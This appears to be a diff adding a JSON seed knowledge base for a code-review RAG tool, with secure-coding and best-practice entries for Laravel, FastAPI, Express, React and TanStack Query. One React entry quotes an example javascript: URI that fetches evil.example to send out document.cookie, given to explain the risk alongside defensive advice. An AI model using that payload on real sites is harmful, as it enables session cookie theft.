@@ -1,0 +1,273 @@
+{
+  "version": 1,
+  "name": "codeguard_mvp_seed",
+  "description": "Curated MVP knowledge for PHP/Laravel, Python/FastAPI, and Node.js/Express RAG validation.",
+  "documents": [
+    {
+      "id": "php_laravel_sql_injection_bindings",
+      "collection": "security_php",
+      "content": "Prefer parameterized queries and framework bindings for user-controlled values. Avoid concatenating request input into raw SQL, and redesign dynamic table or column selection so it comes from trusted allow-listed values.",
+      "metadata": {
+        "topic": "owasp_sql_injection",
+        "category": "security",
+        "language": "php",
+        "framework": "laravel",
+        "source_title": "OWASP SQL Injection Prevention Cheat Sheet",
+        "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+        "confidence": 0.95
+      }
+    },
+    {
+      "id": "php_laravel_query_builder_raw_sql",
+      "collection": "security_php",
+      "content": "Laravel query builder bindings protect values, but raw expressions and user-selected column names are not automatically safe. Treat raw SQL helpers as review hotspots and require explicit binding or allow-listed identifiers.",
+      "metadata": {
+        "topic": "laravel_query_builder_security",
+        "category": "security",
+        "language": "php",
+        "framework": "laravel",
+        "source_title": "Laravel Query Builder Documentation",
+        "source_url": "https://laravel.com/docs/13.x/queries",
+        "confidence": 0.9
+      }
+    },
+    {
+      "id": "php_laravel_authorization_policy_gate",
+      "collection": "security_php",
+      "content": "Sensitive model actions should be guarded with Laravel gates or policies near the controller, action, or service boundary. Do not rely only on hidden UI controls or route naming to enforce authorization.",
+      "metadata": {
+        "topic": "laravel_authorization",
+        "category": "security",
+        "language": "php",
+        "framework": "laravel",
+        "source_title": "Laravel Authorization Documentation",
+        "source_url": "https://laravel.com/docs/13.x/authorization",
+        "confidence": 0.9
+      }
+    },
+    {
+      "id": "php_laravel_validation_boundary",
+      "collection": "bestpractice_php",
+      "content": "Validate request data before it reaches persistence or domain logic. Prefer centralized request validation for complex inputs so controllers and services can assume a documented shape.",
+      "metadata": {
+        "topic": "laravel_validation",
+        "category": "best_practice",
+        "language": "php",
+        "framework": "laravel",
+        "source_title": "Laravel Validation Documentation",
+        "source_url": "https://laravel.com/docs/13.x/validation",
+        "confidence": 0.88
+      }
+    },
+    {
+      "id": "php_laravel_model_not_found_handling",
+      "collection": "quality_general",
+      "content": "When a lookup can legitimately miss, handle the missing record path deliberately. Return a domain-appropriate response, avoid leaking stack traces, and keep the null or not-found branch close to the lookup.",
+      "metadata": {
+        "topic": "missing_null_handling",
+        "category": "code_quality",
+        "language": "php",
+        "framework": "laravel",
+        "source_title": "Laravel Error Handling Documentation",
+        "source_url": "https://laravel.com/docs/13.x/errors",
+        "confidence": 0.84
+      }
+    },
+    {
+      "id": "python_fastapi_security_dependencies",
+      "collection": "security_python",
+      "content": "Use FastAPI security dependencies to make authentication and authorization requirements explicit at route boundaries. Review endpoints that read user identity without a dependency or equivalent guard.",
+      "metadata": {
+        "topic": "fastapi_security_basics",
+        "category": "security",
+        "language": "python",
+        "framework": "fastapi",
+        "source_title": "FastAPI Security Documentation",
+        "source_url": "https://fastapi.tiangolo.com/tutorial/security/",
+        "confidence": 0.9
+      }
+    },
+    {
+      "id": "python_fastapi_dependency_injection_boundary",
+      "collection": "bestpractice_python",
+      "content": "Use FastAPI dependencies to share request-scoped checks, resources, and validation logic without hiding control flow. Keep security-sensitive dependencies explicit on routers or operations.",
+      "metadata": {
+        "topic": "fastapi_dependency_injection",
+        "category": "best_practice",
+        "language": "python",
+        "framework": "fastapi",
+        "source_title": "FastAPI Dependencies Documentation",
+        "source_url": "https://fastapi.tiangolo.com/tutorial/dependencies/",
+        "confidence": 0.88
+      }
+    },
+    {
+      "id": "node_express_security_headers_and_input",
+      "collection": "security_js",
+      "content": "For Express apps, review production security controls such as secure headers, dependency hygiene, input validation, and avoiding verbose error disclosure. Treat untrusted request data as unsafe until validated.",
+      "metadata": {
+        "topic": "express_security_basics",
+        "category": "security",
+        "language": "js",
+        "framework": "express",
+        "source_title": "Express Production Security Best Practices",
+        "source_url": "https://expressjs.com/en/advanced/best-practice-security/",
+        "confidence": 0.9
+      }
+    },
+    {
+      "id": "node_express_middleware_order",
+      "collection": "bestpractice_js",
+      "content": "Express middleware order is part of application behavior. Put validation, authentication, authorization, and error handling in predictable layers so route handlers do not silently bypass shared checks.",
+      "metadata": {
+        "topic": "express_middleware_patterns",
+        "category": "best_practice",
+        "language": "js",
+        "framework": "express",
+        "source_title": "Express Using Middleware Guide",
+        "source_url": "https://expressjs.com/en/guide/using-middleware/",
+        "confidence": 0.86
+      }
+    },
+    {
+      "id": "node_xss_output_escaping",
+      "collection": "security_js",
+      "content": "Prefer framework escaping and safe rendering APIs for user-controlled content. Any direct HTML insertion or template escape hatch should be reviewed for context-aware output encoding or sanitization.",
+      "metadata": {
+        "topic": "xss_output_escaping",
+        "category": "security",
+        "language": "js",
+        "framework": "express",
+        "source_title": "OWASP Cross Site Scripting Prevention Cheat Sheet",
+        "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+        "confidence": 0.92
+      }
+    },
+    {
+      "id": "react_xss_dangerously_set_innerhtml_001",
+      "collection": "security_js",
+      "content": "React escapes text content by default, but dangerouslySetInnerHTML bypasses that protection entirely and injects raw HTML into the DOM. If any part of the injected string comes from user input, a URL parameter, an API response, or a CMS field, an attacker can embed a <script> tag or an event handler attribute and run arbitrary JavaScript in another user's browser session (stored or reflected XSS). Before using dangerouslySetInnerHTML, ask whether plain text rendering (React's default escaping) would work instead. If rich HTML genuinely needs to render (e.g. a CMS-authored article body), sanitize it server-side or client-side with a dedicated library such as DOMPurify immediately before it reaches dangerouslySetInnerHTML, and re-sanitize on every render path, not just on initial save. Never trust a 'sanitized on the backend' assumption without verifying the specific field was actually processed.",
+      "metadata": {
+        "topic": "react_xss_dangerously_set_innerhtml",
+        "category": "security",
+        "language": "js",
+        "framework": "react",
+        "source_title": "React docs - dangerouslySetInnerHTML",
+        "source_url": "https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html",
+        "confidence": 0.92
+      }
+    },
+    {
+      "id": "react_unsafe_url_injection_001",
+      "collection": "security_js",
+      "content": "Setting an href, src, or window.location value from unsanitized input opens the door to javascript: URI injection. A string like javascript:fetch('https://evil.example/steal?c='+document.cookie) placed into an anchor's href or a redirect target will execute when clicked or navigated to, effectively giving an attacker script execution without ever touching innerHTML. This commonly slips in through user-editable profile links, redirect-after-login query parameters, or dynamically built anchor tags in a comment or messaging feature. Validate that any user-supplied URL uses an allowed protocol (http/https only) before rendering it in href/src or passing it to window.location, and prefer an allowlist of protocols over a denylist since new bypass schemes appear over time. Avoid document.write and direct window.location.href assignment from request-derived strings; use the framework's router or a validated URL object instead.",
+      "metadata": {
+        "topic": "react_unsafe_url_injection",
+        "category": "security",
+        "language": "js",
+        "framework": "react",
+        "source_title": "OWASP - Unvalidated Redirects and Forwards Cheat Sheet",
+        "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
+        "confidence": 0.88
+      }
+    },
+    {
+      "id": "react_eval_injection_001",
+      "collection": "security_js",
+      "content": "eval(), new Function(), and passing a string as the first argument to setTimeout/setInterval all compile and execute arbitrary JavaScript at runtime. In a React codebase these usually appear in 'dynamic expression' features: a formula field, a rules engine, or a template renderer that lets a user type a small expression which the app then evaluates directly. Any of these patterns turns untrusted input into code execution in the same context as the rest of the app, including access to cookies, local storage, and any authenticated API client already configured on the page. Replace eval-based expression evaluation with a proper sandboxed expression parser (e.g. a small grammar-based evaluator that only supports arithmetic/logic, not arbitrary statements), or move the evaluation server-side inside a locked-down sandbox. For scheduling callbacks, always pass a function reference to setTimeout/setInterval rather than a string.",
+      "metadata": {
+        "topic": "react_eval_injection",
+        "category": "security",
+        "language": "js",
+        "framework": "react",
+        "source_title": "OWASP - Code Injection",
+        "source_url": "https://owasp.org/www-community/attacks/Code_Injection",
+        "confidence": 0.87
+      }
+    },
+    {
+      "id": "react_client_secret_exposure_001",
+      "collection": "security_js",
+      "content": "Environment variables prefixed with NEXT_PUBLIC_ (Next.js) or VITE_ (Vite) are intentionally inlined into the client-side JavaScript bundle at build time, meaning anything assigned to them is readable by opening browser devtools or viewing the bundled source, no authentication required. A recurring mistake is naming a real secret with one of these prefixes (NEXT_PUBLIC_API_SECRET, VITE_STRIPE_SECRET_KEY, NEXT_PUBLIC_DB_PASSWORD) under the assumption that env files are hidden. Only values that are safe for any visitor to see -- a publishable/publicly-scoped API key, a public feature flag, an analytics ID -- belong behind these prefixes. Server-only secrets (private API keys, database credentials, signing keys) must stay in unprefixed environment variables that are read exclusively in server-side code (API routes, server components, backend services) and never imported into a component that ships to the browser.",
+      "metadata": {
+        "topic": "react_client_secret_exposure",
+        "category": "security",
+        "language": "js",
+        "framework": "react",
+        "source_title": "Next.js docs - Environment Variables",
+        "source_url": "https://nextjs.org/docs/app/building-your-application/configuring/environment-variables",
+        "confidence": 0.9
+      }
+    },
+    {
+      "id": "react_security_basics_001",
+      "collection": "security_js",
+      "content": "A short checklist for reviewing security in a React codebase: (1) treat any dangerouslySetInnerHTML call as a flag requiring a sanitizer library, never raw user input; (2) validate protocols on any user-controlled href/src/redirect target; (3) never pass untrusted strings to eval, new Function, or string-form setTimeout/setInterval; (4) confirm environment variables exposed to the client (NEXT_PUBLIC_*, VITE_*, REACT_APP_*) contain nothing sensitive; (5) check that authentication tokens are not stored in localStorage/sessionStorage where any injected script can read them -- prefer httpOnly cookies where the architecture allows it; (6) verify that client-side route guards are backed by real server-side authorization, since client checks are trivially bypassed by calling the API directly.",
+      "metadata": {
+        "topic": "react_security_basics",
+        "category": "security",
+        "language": "js",
+        "framework": "react",
+        "source_title": "OWASP Top 10 - A03:2021 Injection",
+        "source_url": "https://owasp.org/Top10/A03_2021-Injection/",
+        "confidence": 0.85
+      }
+    },
+    {
+      "id": "tanstack_query_cache_poisoning_001",
+      "collection": "security_js",
+      "content": "TanStack Query caches responses in memory keyed by the queryKey array you provide. If a query key does not include something that scopes it to the current user or session (e.g. a user ID or auth token identifier), switching accounts within the same client session -- common in admin tools, impersonation features, or multi-tenant dashboards -- can serve the previous user's cached data to the new session until the cache naturally expires or is invalidated. This is not a traditional injection bug but a data-leak/authorization bug: user A's private data becomes momentarily visible to user B on the same browser tab. Always include the identity of the acting user (or tenant) as part of the queryKey for any query returning user-specific or tenant-specific data, and call queryClient.clear() or queryClient.resetQueries() on logout/account-switch so no stale cached entries persist across identity changes.",
+      "metadata": {
+        "topic": "tanstack_query_cache_poisoning",
+        "category": "security",
+        "language": "js",
+        "framework": "react",
+        "source_title": "TanStack Query docs - Query Keys",
+        "source_url": "https://tanstack.com/query/latest/docs/framework/react/guides/query-keys",
+        "confidence": 0.83
+      }
+    },
+    {
+      "id": "tanstack_query_unvalidated_params_001",
+      "collection": "security_js",
+      "content": "Building a fetch URL with a template literal directly inside useQuery or useMutation (e.g. fetch(`/api/comments/${userId}`) or fetch(`${baseUrl}/${redirectPath}`)) works fine when the interpolated value is trusted, but becomes a server-side request forgery (SSRF) or path traversal vector the moment that value originates from user input, a route parameter the user can edit, or a query string. An attacker who controls the interpolated segment can redirect the request to an internal-only endpoint, escape the intended path with ../ sequences, or smuggle extra query parameters into the request. Validate and allowlist path/query segments before interpolating them into a fetch URL, prefer a typed request builder (URL object with URLSearchParams) over raw string concatenation, and keep the actual HTTP call inside a small wrapper function so validation logic lives in one place instead of being duplicated at every call site.",
+      "metadata": {
+        "topic": "tanstack_query_unvalidated_params",
+        "category": "security",
+        "language": "js",
+        "framework": "react",
+        "source_title": "OWASP - Server Side Request Forgery Prevention Cheat Sheet",
+        "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
+        "confidence": 0.8
+      }
+    },
+    {
+      "id": "react_best_practices_001",
+      "collection": "bestpractice_js",
+      "content": "Common React review points beyond security: keep the Rules of Hooks (only call hooks at the top level, never inside conditionals/loops) since violating them causes subtle state bugs that only appear on re-render; avoid creating new object/array/function literals as props on every render when passed to memoized children, since it defeats React.memo and causes unnecessary re-renders; prefer deriving state from props/other state during render over syncing it with useEffect, which is a frequent source of double-render bugs and stale closures; and split large components when a single component both fetches data and renders a large tree, since it makes both testing and reasoning about re-render scope harder than necessary.",
+      "metadata": {
+        "topic": "react_best_practices",
+        "category": "best_practice",
+        "language": "js",
+        "framework": "react",
+        "source_title": "React docs - Rules of Hooks",
+        "source_url": "https://react.dev/warnings/invalid-hook-call-warning",
+        "confidence": 0.82
+      }
+    },
+    {
+      "id": "tanstack_query_best_practices_001",
+      "collection": "bestpractice_js",
+      "content": "TanStack Query defaults to treating data as stale immediately (staleTime: 0), which is safe but can cause more refetching than a given screen needs; set an explicit staleTime for data that does not change often instead of leaving every query on the default. Give every query a queryKey that fully describes its parameters (filters, page, sort) so the cache naturally separates different variations instead of one query silently overwriting another's cache entry. For mutations, use onSuccess or the mutation's returned data to invalidate or update only the affected queries (queryClient.invalidateQueries with a specific key) rather than invalidating broadly, which causes unnecessary refetches across unrelated parts of the UI. Handle loading and error states explicitly per query rather than relying on a single global loading flag, since TanStack Query already tracks per-query status.",
+      "metadata": {
+        "topic": "tanstack_query_best_practices",
+        "category": "best_practice",
+        "language": "js",
+        "framework": "react",
+        "source_title": "TanStack Query docs - Important Defaults",
+        "source_url": "https://tanstack.com/query/latest/docs/framework/react/guides/important-defaults",
+        "confidence": 0.84
+      }
+    }
+  ]
+}
